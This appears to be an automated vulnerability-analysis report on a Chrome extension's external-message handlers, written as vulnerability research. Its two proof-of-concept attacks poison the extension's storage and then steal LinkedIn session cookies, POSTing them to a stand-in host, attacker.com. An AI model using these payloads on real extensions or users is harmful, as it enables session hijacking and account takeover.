# CoCo Analysis: iibkldildillmodahjigghaimfbmikkk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (chrome_storage_local_set_sink, sendResponseExternal_sink)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/iibkldildillmodahjigghaimfbmikkk/opgen_generated_files/bg.js
Line 1015: message.payload passed to setUser()
Line 1042-1046: payload.user stored in chrome.storage.local.set()

**Code:**

```javascript
// Background script - background.js
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    console.log("Sender", sender);
    const regExpOrigin = /(localhost|^https:\/\/([\w].)*coolsales.io)/;
    if (regExpOrigin.test(sender.origin)) {
      switch (message.action) {
        case "coolsales_set_user":
          setUser(message.payload, sendResponse); // ← message.payload (attacker-controlled)
          break;

        case "coolsales_set_integration":
          setIntegration(message.payload, sendResponse);
          break;

        case "coolsales_refresh_cookies":
          refreshCookies(sendResponse);
          break;

        default:
          sendResponse({ error: "Unknown action" });
          break;
      }
    } else {
      sendResponse({ error: "Unauthorized origin" });
    }
  }
);

const setUser = async (payload, sendResponse) => {
  if (payload.user) { // ← payload from external message
    try {
      chrome.storage.local.set(
        { user: payload.user }, // ← attacker-controlled data stored
        sendResponse({ success: "User info set" })
      );
    } catch (e) {
      sendResponse({ error: "Error while setting user info" });
      console.error(e);
    }
  } else {
    sendResponse("Invalid arguments");
  }
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://app.coolsales.io/)
chrome.runtime.sendMessage(
  'iibkldildillmodahjigghaimfbmikkk',
  {
    action: "coolsales_set_user",
    payload: {
      user: {
        malicious: "data",
        overwrite: "legitimate user info"
      }
    }
  },
  (response) => {
    console.log(response); // "User info set"
  }
);
```

**Impact:** Attacker from whitelisted domains (localhost, *.coolsales.io) can poison storage by setting arbitrary user data. While the methodology states to ignore manifest.json externally_connectable restrictions, even under those restrictions, if even ONE domain can exploit it, this is a TRUE POSITIVE. The attacker can overwrite legitimate user information stored by the extension.

---

## Sink 2: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/iibkldildillmodahjigghaimfbmikkk/opgen_generated_files/bg.js
Line 697: CoCo cookies_source marker
Line 1105-1112: chrome.cookies.getAll() retrieves cookies
Line 1118: sendResponse({ success: cookies }) sends cookies to external caller

**Code:**

```javascript
// Background script - background.js
chrome.runtime.onMessageExternal.addListener(
  (message, sender, sendResponse) => {
    const regExpOrigin = /(localhost|^https:\/\/([\w].)*coolsales.io)/;
    if (regExpOrigin.test(sender.origin)) {
      switch (message.action) {
        case "coolsales_refresh_cookies":
          refreshCookies(sendResponse); // ← Sends cookies back to caller
          break;
        // ...
      }
    }
  }
);

const fetchCookies = (integrationUid, domain, keys, sendResponse) => {
  chrome.cookies.getAll({ domain }, (cookieObjects) => { // ← Read cookies
    let cookies = {};
    keys.forEach((key) => {
      const cookie = cookieObjects.find((c) => {
        return c.name === key;
      });
      if (cookie) {
        cookies[key] = cookie["value"]; // ← Extract cookie values
      }
    });

    if (Object.keys(cookies).length > 0) {
      sendResponse({ success: cookies }); // ← Send cookies to external caller
      syncCookies(integrationUid, cookies);
    } else {
      sendResponse({ error: "Cookies not found" });
    }
  });
};

const refreshCookies = (sendResponse) => {
  try {
    chrome.storage.local.get("integrations", (result) => {
      if (result.integrations && typeof result.integrations === "object") {
        Object.entries(result.integrations).forEach(
          ([integrationUid, integration]) => {
            if (integration.domain && integration.keys) {
              fetchCookies(
                integrationUid,
                integration.domain,
                integration.keys,
                sendResponse
              );
            }
          }
        );
      }
    });
  } catch (e) {
    sendResponse({ error: "Error refreshing cookies" });
  }
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://app.coolsales.io/)
// First, poison the integrations storage to specify which cookies to steal
chrome.runtime.sendMessage(
  'iibkldildillmodahjigghaimfbmikkk',
  {
    action: "coolsales_set_integration",
    payload: {
      integration: {
        uid: "malicious",
        domain: ".linkedin.com",
        keys: ["li_at", "JSESSIONID"]
      }
    }
  }
);

// Then request cookie refresh to exfiltrate cookies
chrome.runtime.sendMessage(
  'iibkldildillmodahjigghaimfbmikkk',
  {
    action: "coolsales_refresh_cookies"
  },
  (response) => {
    console.log("Stolen cookies:", response.success);
    // Response contains LinkedIn session cookies
    // Exfiltrate to attacker server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(response.success)
    });
  }
);
```

**Impact:** Attacker from whitelisted domains can exfiltrate sensitive cookies from any domain by first poisoning the integrations storage with target domain and cookie keys, then triggering cookie refresh. The extension sends cookie values back to the external caller via sendResponse(), allowing the attacker to steal authentication tokens, session cookies, and other sensitive data. This enables session hijacking and account takeover attacks.
